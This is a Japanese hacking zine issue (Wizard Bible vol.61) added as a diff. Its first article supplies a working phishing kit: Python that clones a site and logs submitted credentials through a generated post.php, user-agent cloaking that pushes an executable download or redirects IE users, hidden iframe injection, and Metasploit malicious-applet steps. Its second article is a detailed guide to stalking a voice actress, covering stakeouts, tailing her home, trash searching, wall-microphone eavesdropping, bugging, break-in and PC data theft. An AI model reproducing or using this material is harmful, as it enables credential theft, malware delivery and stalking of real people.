@@ -1,0 +1,722 @@
+[-]=======================================================================[-]
+
+                      Wizard Bible vol.61 (2015,12,6)
+
+[-]=======================================================================[-]
+
+
+x0xXx0xx0xXx0xx0xXx0xx0xXx0xx0xXx0xx0xXx0xx0xXx0xx0xXx0xx0xXx0xx0xXx0xx0xXx0x
+x0xXx0xx0xXx0xx0xXx0xx0xXx0xx0xXx0xx0xXx0xx0xXx0xx0xXx0xx0xXx0xx0xXx0xx0xXx0x
+
+---- 第0章：目次 ---
+
+x0xXx0xx0xXx0xx0xXx0xx0xXx0xx0xXx0xx0xXx0xx0xXx0xx0xXx0xx0xXx0xx0xXx0xx0xXx0x
+x0xXx0xx0xXx0xx0xXx0xx0xXx0xx0xXx0xx0xXx0xx0xXx0xx0xXx0xx0xXx0xx0xXx0xx0xXx0x
+
+○第1章: フィッシングについてのまとめ                            黒林檎 著
+
+○第2章: 『ハッカーの学校 個人情報調査の教科書』の考察         IPUSIRON 著
+
+○第3章: お知らせ
+
+○第4章: 著者プロフィール
+
+
+x0xXx0xx0xXx0xx0xXx0xx0xXx0xx0xXx0xx0xXx0xx0xXx0xx0xXx0xx0xXx0xx0xXx0xx0xXx0x
+x0xXx0xx0xXx0xx0xXx0xx0xXx0xx0xXx0xx0xXx0xx0xXx0xx0xXx0xx0xXx0xx0xXx0xx0xXx0x
+
+--- 第1章: フィッシングについてのまとめ ---
+
+著者：黒林檎
+
+x0xXx0xx0xXx0xx0xXx0xx0xXx0xx0xXx0xx0xXx0xx0xXx0xx0xXx0xx0xXx0xx0xXx0xx0xXx0x
+x0xXx0xx0xXx0xx0xXx0xx0xXx0xx0xXx0xx0xXx0xx0xXx0xx0xXx0xx0xXx0xx0xXx0xx0xXx0x
+
+
+■0x01.) 最初に
+
+　マイナンバー制度が始まりました。それに伴いマイナンバーを狙うフィッシン
+グサイトが多数作成されています。
+　そこで今回は自分でフィッシングツールを作成して、フィッシングサイトにつ
+いて考えていきます。
+
+
+■0x02.) 環境
+
+　現状最新版のKali Linux(x64)で動作させます。
+
+https://www.kali.org/downloads/　（kali LinuxのISOファイル）
+
+　また、仮想環境用のイメージファイルがありますので、仮想環境で実行する方
+はそちらをおすすめします。
+　VMイメージで欲しい方は下記URLからダウンロードしてください。
+
+https://www.offensive-security.com/kali-linux-vmware-arm-image-download/
+
+
+■0x03.) 基礎のフィッシングスクリプトを作成
+
+　Google　Chromeのページダウンロード機能はすばらしいです。Google Chromeの
+ダウンロード機能を使用して作成したhtmlのform属性を書き換えるだけで簡単な
+フィッシングサイトを作成できてしまいます。しかし、ルート相対パスのウェブ
+サイトはページが崩れてしまいます。
+
+　ルート相対パスと相対パスの例は次の通りです。
+
+<p>サイトルート相対パス</p>
+<img src="/images/wizardbible.jpg"/>
+<p>相対パス</p>
+<img src="images/wizardbible.jpg"/>
+
+　サイトルート相対パスの" / "は Webサーバのルートのため、サービス上では
+「http://wizardbible.org/images/wizardbible.jpg」などのアドレスを指し、適
+切に表示されますが、ローカルコンピュータ上ではローカルドライブ直下がルー
+トとして認識されるために誤った場所が参照され、リンクが正しく無いため画像
+イメージなどが表示されません。
+　これで現状のフィッシングツールではフィッシングサイトを作成できないため、
+工夫が必要になります。
+
+　では単純にルート相対パスを潰してしまってはどうでしょう？
+　Pythonではhtmlを簡単に整形できます。
+
+　下記関数でそれを実行します。
+
+-----
+#########################
+#リンクを絶対パスに置き換える#
+##########################
+def relaive(clonesite,base):
+    fullpath = "/clone/index.html"
+    site = "index.html"
+    with open(clonesite, "r") as rf:
+        doc = html.parse(rf).getroot()
+        html.make_links_absolute(doc, base)
+    fileopen=file("/clone/index.html","r").readlines()
+    filewrite=file(fullpath,"w")
+    try:
+        for line in fileopen:
+            counter=0
+            match=re.search('post',line, flags=re.IGNORECASE)
+            method_post=re.search("method=post", line, flags=re.IGNORECASE)
+            if match or method_post:
+                line = re.sub('action="*"', 'action="post.php"', line)
+            match2 = re.search("swiftActionQueue={buckets:j", line, flags=re.IGNORECASE)
+            if match2:
+                line = line.replace("swiftActionQueue={buckets:j", "swiftActionQueue={3buckets:j")
+            filewrite.write(line)
+	print "action attribute it was rewritten to post.php.."
+    except:
+	print "file write error.."
+    finally:
+        filewrite.close()
+##################################################################################################
+##################################################################################################
+-----
+
+　お気づきでしょうか？
+　上記関数でaction="hoge"の値をpost.phpに書き換えています。
+　今回は、入力された値を受け取りファイルに書き込むphpファイルも自動で作成
+することにします。python上でpost.phpというphpファイルとlog.txtというファ
+イルを作成します。post.phpがlog.txtに対して作成したフィッシングサイトの入
+力値をそのまま書き込んでいくようにします。
+
+-----
+###############################
+#phpスクリプトを自動で作成する#
+###############################
+def makephp(RAW_URL):
+        logpath = "/clone/"
+        filewrite = file("%s/post.php" % (logpath), "w")
+        filewrite.write("""<?php $file = 'log.txt';file_put_contents($file, print_r($_POST, true), FILE_APPEND);?><meta http-equiv="refresh" content="0; url=%s" />""" % (RAW_URL))
+        filewrite.close()
+        filewrite = file("%s/log.txt" % (logpath), "w")
+        filewrite.write("")
+        filewrite.close()
+        if sys.platform == "darwin":
+            subprocess.Popen("chown _www:_www '%s/log.txt'" % (logpath), shell=True).wait()
+        else:
+            subprocess.Popen("chown www-data:www-data '%s/log.txt'" % (logpath), shell=True).wait()
+##################################################################################################
+##################################################################################################
+-----
+
+　次のプログラムは完成版になります。
+
+-----
+##############
+####完成版####
+##############
+
+from lxml import html
+import subprocess
+import os,sys,time,re,shutil,urllib2
+
+###setting###
+html_parser = html.HTMLParser(encoding="utf-8")
+#############
+
+def setdirectory():
+    if check_os() == "posix":
+        return os.path.join(os.path.expanduser('~'), '/clone')
+    if check_os() == "windows":
+        return "src/program_junk/"
+
+def check_os():
+    if os.name == "nt":
+        operating_system = "windows"
+    if os.name == "posix":
+        operating_system = "posix"
+    return operating_system
+
+def makephp(RAW_URL):
+        logpath = "/clone/"
+        filewrite = file("%s/post.php" % (logpath), "w")
+        filewrite.write("""<?php $file = 'log.txt';file_put_contents($file, print_r($_POST, true), FILE_APPEND);?><meta http-equiv="refresh" content="0; url=%s" />""" % (RAW_URL))
+        filewrite.close()
+        filewrite = file("%s/log.txt" % (logpath), "w")
+        filewrite.write("")
+        filewrite.close()
+        if sys.platform == "darwin":
+            subprocess.Popen("chown _www:_www '%s/log.txt'" % (logpath), shell=True).wait()
+        else:
+            subprocess.Popen("chown www-data:www-data '%s/log.txt'" % (logpath), shell=True).wait()
+
+def relaive(clonesite,base):
+    fullpath = "/clone/index.html"
+    site = "index.html"
+    with open(clonesite, "r") as rf:
+        doc = html.parse(rf).getroot()
+        html.make_links_absolute(doc, base)
+    fileopen=file("/clone/index.html","r").readlines()
+    filewrite=file(fullpath,"w")
+    try:
+        for line in fileopen:
+            counter=0
+            match=re.search('post',line, flags=re.IGNORECASE)
+            method_post=re.search("method=post", line, flags=re.IGNORECASE)
+            if match or method_post:
+                line = re.sub('action="*"', 'action="post.php"', line)
+            filewrite.write(line)
+	print "action attribute it was rewritten to post.php.."
+    except:
+	print "file write error.."
+    finally:
+        filewrite.close()
+
+def clone(url):
+    user_agent = "Mozilla/5.0 (Windows; Intel Mac OS X) Chrome/45.0.2454.101 Safari/537.36"
+    try:
+            wget = 0
+            if os.path.isfile("/usr/local/bin/wget"):
+                wget = 1
+                
+            if os.path.isfile("/usr/bin/wget"):
+                wget = 1
+
+            if os.path.isfile("/usr/local/wget"):
+                wget = 1
+
+            if wget == 1:
+                subprocess.Popen('cd %s;wget --no-check-certificate -O index.html -c -k -U "%s" "%s";' % (setdir,user_agent,url), stdout=subprocess.PIPE, stderr=subprocess.PIPE, shell=True).wait()
+            if wget == 0:
+                headers = { 'User-Agent' : user_agent }
+                req = urllib2.Request(url, None, headers)
+                html = urllib2.urlopen(req).read()
+                if len(html) > 1:
+                    try:
+                        filewrite = file(setdir + "/index.html", "w")
+                        filewrite.write(html)
+                    except:
+                        print "index.html write error"
+                    finally:
+                        ilewrite.close()
+
+    except:
+        print "Sorry error to be continue .."
+        pass
+
+
+
+if __name__ == '__main__':
+    print """
+###############################################
+#The python script that web site also was set #
+#to be the creation of the link relative path #
+#for r00tapple 				      #
+###############################################
+    """
+
+    setdir = setdirectory()
+    if not os.path.isdir(setdir):
+        os.makedirs(setdir + "/web_clone")
+
+    #input url
+    URL = raw_input("URL of clone sites that you create: ")
+    clone(URL)
+    domain = raw_input("Enter the http://****.com/ of creating clones site :")
+    makephp(domain)
+    path = setdir + "/index.html"
+    relaive(path,domain)
+    print "END"
+
+##################################################################################################
+##################################################################################################
+##################################################################################################
+-----
+
+
+■0x04.) 動作テスト
+
+　0x03で作成したプログラムを動作すると次のようになります。
+-----
+root@r00tapple:~# python pfishing.py
+
+###############################################
+#The python script that web site also was set #
+#to be the creation of the link relative path #
+#for r00tapple 				      #
+###############################################
+    
+URL of clone sites that you create: http://ruffnex.oc.to/
+Enter the http://****.com/ of creating clones site :http://ruffnex.oc.to/
+END
+root@r00tapple:~# 
+-----
+
+　サイトリンクを絶対パスに置き換えることで、ルート相対パスのウェブサイト
+を綺麗にコピーし、基本的なフィッシングサイトとして動作できるようになりま
+した。
+　フィッシングサイトというと入力値を抜き取るだけと考える方も多いですが、
+最近では特定の環境下だけ攻撃を仕掛けるフィッシングサイトも出てきました。
+そこで今回は特定の環境下の場合違うコードを実行する方法を考えます。
+
+
+■0x05.) UserAgentによって挙動を変更する
+
+　入力された情報を抜き取るフィッシングサイトの一例は多いですが、特定の環
+境下の場合だけ悪意あるスクリプトを実行させたい場合はどうでしょう？　例え
+ばIEのユーザーの場合だけ悪意あるJavaアプレットやマルウェアをダウンロード
+させたりすればどうでしょう？
+　IEの場合だけ0dayを実行するフィッシングサイトは最近ありました。
+
+http://www.welivesecurity.com/2015/10/15/brolux-trojan-targeting-japanese-banks/
+
+　このサイトはChromeユーザーなどには普通のフィッシングサイトに見えますが、
+IEの場合だけ0dayを仕掛けるフィッシングサイトです。それを簡単に真似するに
+は二つの方法があります。
+
+-----
+####################################
+####.htaccessによるUserAgent制限####
+####################################
+#OSがwindowsでブラウザがIEの場合ruffnex.oc.toにリダイレクトする
+
+<Files ~ "^\.ht">
+deny from all
+</Files>
+
+RewriteEngine On
+
+SetEnvIfNoCase User-Agent "Windows"         ua_os=windows
+SetEnvIfNoCase User-Agent "Mac.*OS"         ua_os=macos
+SetEnvIfNoCase User-Agent "Linux"           ua_os=linux
+SetEnvIfNoCase User-Agent "BSD"             ua_os=linux
+SetEnvIfNoCase User-Agent "Android"         ua_os=android
+
+SetEnvIfNoCase User-Agent "Safari"          ua_browser=safari
+SetEnvIfNoCase User-Agent "(MSIE|Trident)"  ua_browser=ie
+SetEnvIfNoCase User-Agent "Chrome"          ua_browser=chrome
+SetEnvIfNoCase User-Agent "Firefox"         ua_browser=firefox
+SetEnvIfNoCase User-Agent "Opera"           ua_browser=opera
+
+RewriteBase /
+
+RewriteCond %{REQUEST_URI} !^http://ruffnex.oc.to/.*$
+RewriteCond %{ENV:ua_os} windows [OR]
+RewriteCond %{ENV:ua_browser} ie
+RewriteRule ^(.*)$ http://ruffnex.oc.to/$1 [R,L]
+##################################################################################################
+##################################################################################################
+##################################################################################################
+-----
+
+　同様のことがJavascriptでも可能です。
+
+-----
+######################################
+####javascriptによるUserAAgent制限####
+######################################
+#UserAgentがIEの場合だけtest.exeをダウンロードする
+
+<script>
+var downloadURL = function downloadURL(url) {
+var hiddenIFrameID = 'hiddenDownloader',
+iframe = document.getElementById(hiddenIFrameID);
+if (iframe === null) {
+iframe = document.createElement('iframe');
+iframe.id = hiddenIFrameID;
+iframe.style.display = 'none';
+document.body.appendChild(iframe);
+}
+iframe.src = url;
+};
+var ua = window.navigator.userAgent;
+if( ua.indexOf("Mozilla/5.0") != -1 ){
+alert(1);
+downloadURL('./test.exe');
+}
+</script>
+##################################################################################################
+##################################################################################################
+##################################################################################################
+-----
+
+　pythonでhtmlを整形する際に、特定のタグ<body>タグなどをreplaceしてしまい
+悪意あるコードに書き換えてしまう方法などもあります。使用方法としては、フ
+ィッシングページを作成する際に同時にmetasploitで悪意あるJavaアプレットな
+どが挿入してしまう方法があります。
+　また、下記ではhtml内の特定のタグを書き換える関数です。
+
+-----
+############################################
+####<head>タグにiframeを挿入するサンプル####
+############################################
+def replases(html)
+    #Rewrite the head tag of html
+    fileopen=file("/clone/index.html","r").readlines()
+    try:   
+        line=line.replace("<head>", '<head><iframe src = "http://%s:80/" width="100" height="100" scrolling="no" ></iframe>' % (ipaddr))
+        filewrite.write(line)
+-----
+
+　MetasploitのJava appletの生成も参考程度ですが、以下です。
+
+-----
+###########################################
+#######Metasploitのコマンドサンプル########
+###########################################
+  msf > use exploit/multi/browser/java_signed_applet
+      msf exploit(java_signed_applet) > show targets
+            ...targets...
+      msf exploit(java_signed_applet) > set TARGET <target-id>
+      msf exploit(java_signed_applet) > show options
+            ...show and set options...
+      msf exploit(java_signed_applet) > exploit
+-----
+
+　setoolkitが使用している方法は、下記のようにすでに作成してあるJava.java
+というアプレット用のファイルをコンパイルします。
+
+----
+subprocess.Popen("rm Java_Update.jar", stderr=subprocess.PIPE, stdout=subprocess.PIPE, shell=True)
+subprocess.Popen("rm Java.class", stderr=subprocess.PIPE, stdout=subprocess.PIPE, shell=True)
+subprocess.Popen("javac Java.java", shell=True).wait()
+subprocess.Popen("jar cvf Java_Update.jar Java.class", shell=True).wait()
+subprocess.Popen("jar ufm Java_Update.jar manifest.mf", shell=True).wait()
+subprocess.Popen("cp Java_Update.jar ../../html/unsigned/unsigned.jar", shell=True)
+-----
+
+　これをコピーサイト作成の段階で、replaceで置き換えています。
+
+・Pythonで悪意あるJava appletを挿入
+http://exploit.co.il/hacking/metasploit-java-meterpreter-payload/
+・PythonでMetasploitの自動化
+http://www.primalsecurity.net/python-for-metasploit-automation/
+
+　上記サイトなどを参考にmetasploitで攻撃コードを埋め込んで遊んでみてくだ
+さい。
+　また、ユニークなフィッシングを思いついたら是非教えてください。
+
+
+
+x0xXx0xx0xXx0xx0xXx0xx0xXx0xx0xXx0xx0xXx0xx0xXx0xx0xXx0xx0xXx0xx0xXx0xx0xXx0x
+x0xXx0xx0xXx0xx0xXx0xx0xXx0xx0xXx0xx0xXx0xx0xXx0xx0xXx0xx0xXx0xx0xXx0xx0xXx0x
+
+--- 第2章: 『ハッカーの学校 個人情報調査の教科書』の考察 ---
+
+著者：IPUSIRON
+
+x0xXx0xx0xXx0xx0xXx0xx0xXx0xx0xXx0xx0xXx0xx0xXx0xx0xXx0xx0xXx0xx0xXx0xx0xXx0x
+x0xXx0xx0xXx0xx0xXx0xx0xXx0xx0xXx0xx0xXx0xx0xXx0xx0xXx0xx0xXx0xx0xXx0xx0xXx0x
+
+
+■0x01.) はじめに
+
+　この度、『ハッカーの学校 個人情報調査の教科書』（以降、「個人情報調査本」
+と略する）が2015年12月11日に発売されます。今回のハッカーの学校のテーマは、
+ソーシャルエンジニアリングになります。アナログ・デジタルを区別することな
+く、総合的に活用してターゲットの個人情報を調査する方法を解説しています。
+
+http://www.amazon.co.jp/dp/4781702139　（Amazonのページ）
+
+　公式ページについては近日中に公開予定です。追って詳細をSecurity Akademeia
+の告知ページに載せる予定です。
+
+http://akademeia.info/index.php?FrontPage#t1585870
+
+　WBのリリースと「個人情報調査本」の発売時期のタイミングが合いましたので、
+今回の記事は「個人情報調査本」について触れたいと思います。「個人情報調査
+本」はアナログ・デジタルのハッキング技術を融合した総合的なソーシャルエン
+ジニアリングについて解説しています。多岐にわたるソーシャルエンジニアリン
+グの技術を解説し、それを知ることでストーカーたちから自身や大事な人を守る
+ことを目的としています。
+　今回の記事では、あえてストーカーの立場で、「個人情報調査本」を参考にし
+た例について解説します。あくまで妄想です。犯罪なので絶対に実践しないでく
+ださい。
+
+
+■0x02.) ターゲットの選定
+
+　まず情報調査のターゲットを選定します。あくまで妄想なのでターゲットを選
+定しています。実際であれば事前にターゲットは決まっているはずです。
+　家族（配偶者・親・子）、恋人（同棲相手、遠距離恋愛の相手を含む）などの
+例は「個人情報調査本」で紹介した方法で簡単に情報調査を実現できてしまいま
+す。それでは面白くありません。そんなときに、あるまとめサイトに次のような
+記事を見つけました。
+
+「声優へのプレゼントにGPS仕込む声豚ｗｗｗｗ」
+http://onecall2ch.com/archives/8162725.html
+
+　今回は好きな声優の個人情報を調査するというシナリオを考察します。
+　上記のサイトのやり取りのように、GPS発信機を使えば、目当ての声優の居住地
+を特定できる可能性はあります。しかし、あまり現実的ではありません。GPS発信
+機を埋め込んだプレゼントが声優の手に渡り、さらに自宅に持ち帰られるとは限
+りません。さらに、技術的に問題として、GPS発信機は携帯電話等の電波を使用す
+るわけですが、常時電波を発信するタイプのものは常にバッテリーの消費の問題
+が生じます。この問題を解決する方法として、数日後に電波を出すように工夫し
+たり、コンセントから電源をとる商品をプレゼントしたりする方法が考えられま
+す。いずれにしても、電子回路の知識が必要となります。成功率の低い攻撃にお
+いて、高価なGPS発信機を使い捨てするぐらいであれば、情報屋や探偵にそれ相応
+のお金を払って依頼した方が確実といえます。
+「個人情報調査本」を読んだ人であれば、すぐにこんな方法よりももっと効率的
+かつ効果的な方法を思いつくはずです。次の項でその方法を紹介します。
+
+
+■0x03.) 攻撃のアプローチの手順と方法
+
+　完全に具体的な方法を書いてしまうと問題になりそうなので、簡潔に解説しま
+す。PCで監視する方法もありますが、今回は確実かつ簡単なアナログ的な手法を
+用います。これならば根気さえあれば誰にでも実践できます。
+　まず手順としては「本人特定→住所特定→情報収集（盗聴・PCデータの奪取）」
+という流れになります。
+　先ほど紹介した記事の方法では、成功すればターゲットの住所を簡単に特定で
+きるかもしれませんが、成功率が低すぎます。ここで紹介する方法では、一歩ず
+つ確実に情報を積み重ねていきます。ターゲットを探すために時間を費やすかも
+しれませんが、費やした時間もターゲットの行動を予測する上で役立ってきます。
+
+　それでは個々の攻撃のアプローチについて簡単に解説します。
+
+●本人特定
+
+　ターゲットが訪れると予想される場所で張り込みます。ラジオのレギュラー番
+組を持っている声優であれば、話は簡単です。ラジオを聞いていれば2本撮り（2
+週分を1回で収録すること）していることは特定できるはずです。ターゲットが自
+ら発言で漏らすことがあります。また、動画で配信されているラジオであれば、
+服装から推測できる場合もあります。つまり、少なくとも2週間に1回は訪れてい
+ることになります。
+　どの曜日に収録しているかわからなくても、ビルの出入りで2回通過することを
+考えれば、2週間に少なくとも2回チャンスがあることになります。
+　ラジオを収録する場所はいくつか考えられますが、ここでは文○放送だったと
+仮定しましょう。張り込む場所としては、いくつか候補があります。1つ目はビル
+の出入り口を監視できる場所です。例えば、道路を挟んだビルの向かい側、ビル
+の中のローソン、旧○離宮恩賜庭園前のベンチ（庭園の中に入らない）などが挙
+げられます。特に最後にあげたベンチからビルまでは若干距離があるので、単眼
+鏡を活用します（双眼鏡の方が見やすいですが、怪しまれるため）。2つ目は駅の
+改札を監視できる場所です。最寄り駅はJR浜○町や東京メトロの○門駅になりま
+す。実際に訪れたことがある人であればわかりますが、JR浜○町の改札は人の出
+入りが多いですが、改札がひとつしかありませんし、周りに店も多くあり、監視
+しやすいといえます。
+　張り込みの具体的な方法については「個人情報調査本」で紹介しています。例
+えば、張り込む場所の選定、張り込み中の格好、張り込みがばれないようにする
+ための方法などです。
+　張り込みは誰でもできる簡単な仕事のように思えますが、肉体的な疲労だけで
+はなく、精神的な疲労も伴います。他人の視線が非常につらいものです。張り込
+みに失敗すれば、その後の尾行の失敗にも繋がります。また、張り込みに成功し
+てターゲットが発見しても、尾行に失敗してしまえば張り込みからやり直しにな
+ってしまいます。ただし、ターゲットに張り込みや尾行に感づかれなければ、タ
+ーゲットの行動がある程度絞り込むことができるので、以後の調査は少し楽にな
+るはずです。
+　駅の中は人が多いため、ターゲットであることを特定する作業が困難になりま
+す。たくさんの人の顔をずっと見ていると、そのうちどれも同じように思えてく
+ることさえあります。本当は顔だけではなく、身体の癖（歩き方など）を知って
+いれば特定が楽になりますが、ここではそういった事前情報はありません。特に
+女性の場合は化粧によって顔が変わるので、特徴をとらえてターゲットを特定し
+ます。声優は声の仕事なので、他人から風邪をうつされないようにマスクをして
+いる可能性が高いといえます。特に不特定多数の人がいる駅や電車内はなおさら
+です。マスクは顔を隠して特定しにくいと思われますが、逆にこれをターゲット
+の特定に利用してしまうのです。
+
+●住所特定
+
+　ターゲットの行動としては、文○放送のビルに向かう場合と帰宅する場合の2つ
+があります。前者であれば、尾行しても自宅の住所を特定することはできません。
+ただし、服装・髪型・持ち物など（女性であれば化粧の度合い）は特定すること
+ができます。ここで知った情報を帰宅するターゲットの張り込みに活用します。
+　帰宅するターゲットを特定した場合、尾行することによって、自宅を特定する
+ことができます。まっすぐ自宅に帰るとは限りませんが、いつかは自宅に帰るは
+ずだからです。
+　尾行の具体的な方法については「個人情報調査本」で紹介しています。特に注
+意が必要なのは、ターゲットがタクシーに乗り込んだ場合です。徒歩かつ単独で
+尾行しているときに、ターゲットにバスやタクシーに乗られてしまうと、尾行初
+心者の場合は焦ってしまうでしょう。「個人情報調査本」に書かれている内容を
+参考にして、落ち着いて行動すればなんとかなります。どうしても心配であれば、
+仮想のターゲットを利用して事前に練習するのも手だと思います。
+　ターゲットの自宅らしき場所を特定できたとします。一戸建て（実家暮らしな
+ど）であれば確実に特定できるわけですが、マンションであれば部屋番号を特定
+する必要があります。オートロックの扉の前に郵便受けがあり、ターゲットが自
+分の郵便受けを開けている様子があれば、注意深く観察してください。その郵便
+受けがターゲットの部屋と対応しているからです。そういった素振りを見せなか
+ったり、見逃してしまったりした場合には、後日に調査したほうがよいでしょう。
+後でじっくり確実に調査できるからです。ターゲットが一般人であれば、ピギー
+バックをしてさらに尾行を継続してもよいのですが、声優であれば少々はストー
+カーに対して警戒しているはずです。欲を出してこれまでの苦労が水の泡になっ
+てはもったいないといえます。可能であれば、エレベータが止まった階のランプ、
+玄関の扉が閉まる音を確認しておきます。エレベータが止まってからドアが開く
+音までの時間差やドアが閉じる音の大きさから、部屋の場所を大雑把に推測でき
+る場合があります。
+
+●情報収集
+
+　ターゲットの自宅を突き止めることができたら、一気に情報を集めることがで
+きます。方法としてはいくつかのアプローチが考えられます。
+
+①トラッシング
+②聞き込み
+③盗聴等
+④侵入
+
+　いずれの方法も「個人情報調査本」で詳細に解説しているので、ここではポイ
+ントだけ解説します。
+
+　トラッシングとは、ゴミを漁って情報を収集する行為です。ゴミは情報の宝庫
+といえます。特に日本ではそれが顕著です。ターゲットがマンション住まいで部
+屋番号を特定できていない場合でも、実践することが可能です。マンションの住
+民は同一の場所にゴミを捨てるはずだからです。ゴミの中から住所を特定できる
+者が出てくれば、部屋番号を知ることができます。また、ゴミの内容から、ター
+ゲットの個人情報だけではなく、趣味・嗜好・交友関係なども特定できます。逆
+に独り暮らしではない場合は、ゴミ袋の中にターゲット以外の人物のゴミも混ざ
+っているため、情報の特定に手間取る場合があります。
+　交友関係を特定することができれば、そこからソーシャルエンジニアリングで
+情報を聞き出すことができます。
+
+　聞き込みとは、近隣住民から情報を得る方法です。ソーシャルエンジニアリン
+グの達人であれば、ターゲット本人から情報を聞き出すことができます。ターゲ
+ットが女性の場合は、マンションの管理人から情報を聞き出すことは難しいとい
+えます。マンションの住人から聞き出す方法もあります。大抵のマンションには
+長く暮らしている住民がいるはずです。そういった住民からターゲットの行動（
+出勤・帰宅時間）や交友関係（部屋に訪れる異性がいるかどうか）などを聞き出
+します。特に、ゴミを分別していない、夜中に部屋で騒いだことがあるといった
+場合には、容易に情報を聞き出せます。
+
+　盗聴等とは盗聴や盗撮によって情報を収集する行為です。盗聴等といった場合
+には、盗聴だけではなく、盗撮を含むこととします。盗聴器を仕掛けるためには、
+通常部屋に侵入する必要がありますが、部屋に侵入せずに盗聴できる方法がいく
+つかあります。「遠隔地からのスマホによる盗聴」「窓の振動からの会話の盗聴」
+「コンクリートマイクによる壁越しの盗聴」などです。さらに、ターゲットが知
+らずに盗聴器を自身で設置させてしまうという方法があります。プレゼントの中
+に盗聴器を仕込んでおき、ターゲットに渡す方法が代表的なものです。他に特殊
+な例になりますが、訪問販売員や点検業者になりすまして、玄関まであがり、タ
+ーゲットが目を離したすきに玄関に盗聴器を仕掛けてしまう方法があります。部
+屋の間取りにもよりますが、玄関から別の部屋の会話を十分に盗聴できる場合が
+あります。いずれにせよターゲットの部屋に侵入しなくても、これだけの盗聴の
+アプローチがあるわけです。後は電波や電源の問題を勘案しながら、最適な方法
+を選択します。
+　お金に余裕があれば、隣に引っ越して、コンクリートマイクで盗聴することが
+ベストといえます。コンクリートマイクによる盗聴は妨害することは可能であっ
+ても、発見することはほぼ不可能といえます。隣部屋であれば、ゴミ出しや出入
+りの際にすれ違う機会があり、挨拶程度ならしてくれると考えられます（ここか
+ら親しくなる可能性はほとんどゼロに近いと思われますが）。
+
+　侵入は不正に部屋に入る行為です。ピッキングやバイパス解錠などの技術が必
+要となります。そういった技術がない場合でも、ターゲットがゴミ出しで施錠を
+していないタイミングがあれば、その間に玄関に盗聴器を設置する時間ぐらいは
+あるでしょう。留守中に侵入することができれば、ほとんどのことが実行できて
+しまいます。部屋の任意の場所に盗聴器や盗撮器を設置することができます。た
+だし、電源・集音・電波の問題から設置場所は少々限定はされます。PCがあれば、
+中身のデータを奪取することが可能です。インターネット経由でPCに侵入するこ
+とは困難であっても、PCに直に触ることができれば管理者権限でやりたい放題で
+きます。ログオン認証を破ることは簡単にできますし、HDD内のデータをコピーす
+ることもできます。場合によっては遠隔操作プログラムをインストールしておき、
+以後の情報調査に備えることもできます。
+
+　以上の攻撃により、ターゲットの情報を調査していきます。入手した情報を活
+用して、次の情報調査に活用します。情報調査は繰り返し行うことで、より機密
+性の高い情報を入手し、さらに入手した情報の信頼性を確認するのです。
+
+
+■0x04.) 終わりに
+
+　繰り返しになりますが、この記事で紹介したことを絶対に実践してはいけませ
+ん。ストーカーの思考や行動を知ることで、ストーカーから身を守ることができ
+ます。是非とも自分や大切な人（家族や恋人など）を守るために活用してくださ
+い。
+　本当にターゲットのことを思っているのであれば、形のある応援をしましょう。
+アニメの違法視聴で満足するのではなく、DVDやブルーレイディスクを買いましょ
+う。ラジオCDや写真集を買いましょう。公開録音でグッズを購入したり、コンサ
+ートに参加したりしましょう。プレゼントするのであれば、商品券や現金が一番
+喜ばれると思いますよ。
+
+
+
+x0xXx0xx0xXx0xx0xXx0xx0xXx0xx0xXx0xx0xXx0xx0xXx0xx0xXx0xx0xXx0xx0xXx0xx0xXx0x
+x0xXx0xx0xXx0xx0xXx0xx0xXx0xx0xXx0xx0xXx0xx0xXx0xx0xXx0xx0xXx0xx0xXx0xx0xXx0x
+
+ --- 第3章: お知らせ ---
+
+x0xXx0xx0xXx0xx0xXx0xx0xXx0xx0xXx0xx0xXx0xx0xXx0xx0xXx0xx0xXx0xx0xXx0xx0xXx0x
+x0xXx0xx0xXx0xx0xXx0xx0xXx0xx0xXx0xx0xXx0xx0xXx0xx0xXx0xx0xXx0xx0xXx0xx0xXx0x
+
+○Wizard Bible（http://wizardbible.org/）では随時、執筆ライターを募集して
+います。
+　扱う内容のテーマは広義での「under ground」です。例えばハッキングやセキ
+ュリティからピッキングなどと幅広い内容を考えています。また特殊な職業や趣
+味の解説などでも構いません。
+　一回きりでも構いません。また必ず毎回連載する義務もありませんので、でき
+る範囲で構いません。気軽に声をかけてください。
+
+○Kenji AikoさんがQ&Aを作ってくれました。初めて参加する人でもわかりやすく
+書かれていますので、参考にしてください。
+
+http://wizardbible.org/wbQandA.html
+
+○Wizard Bibleに参加希望の方は気軽にメール（ipusiron@gmail.com）ください。
+
+
+
+x0xXx0xx0xXx0xx0xXx0xx0xXx0xx0xXx0xx0xXx0xx0xXx0xx0xXx0xx0xXx0xx0xXx0xx0xXx0x
+x0xXx0xx0xXx0xx0xXx0xx0xXx0xx0xXx0xx0xXx0xx0xXx0xx0xXx0xx0xXx0xx0xXx0xx0xXx0x
+
+  --- 第4章: 著者プロフィール ---
+
+x0xXx0xx0xXx0xx0xXx0xx0xXx0xx0xXx0xx0xXx0xx0xXx0xx0xXx0xx0xXx0xx0xXx0xx0xXx0x
+x0xXx0xx0xXx0xx0xXx0xx0xXx0xx0xXx0xx0xXx0xx0xXx0xx0xXx0xx0xXx0xx0xXx0xx0xXx0x
+
+
+■黒林檎
+●Job: 自宅警備員
+●Web: http://ruffnex.oc.to/kuroringo/kuroringo/me.html
+●Web2: http://www.packr.org/
+●Twitter: @r00tapple
+●Mail: packr@packr.org
+●Comment:
+　今回はフィッシングについて書かせていただきました。
+　面白いフィッシングや犯罪に使用された面白い事例などあれば是非教えてくだ
+さい。
+
+
+■IPUSIRON
+●Job: 自宅警備員
+●Web: http://akademeia.info
+●Twitter: @ipusiron
+●Mail: ipusiron@gmail.com
+●Comment:
+　皆さまのおかげで2015年1月に発売した『ハッカーの学校』が7刷までいきまし
+た。本当にありがとうございました。
+　『ハッカーの学校』が予想以上に売れたため、第2弾として『ハッカーの学校 
+個人情報調査の教科書』が2015年12月に発売されることになりました。今回の本
+がある程度売れると、『ハッカーの学校』の第3弾・第4弾と続くことになります。
+　興味がある方は是非「個人情報調査本」を立ち読みで確認してみてください。
+
+http://www.amazon.co.jp/dp/4781702139
+
+
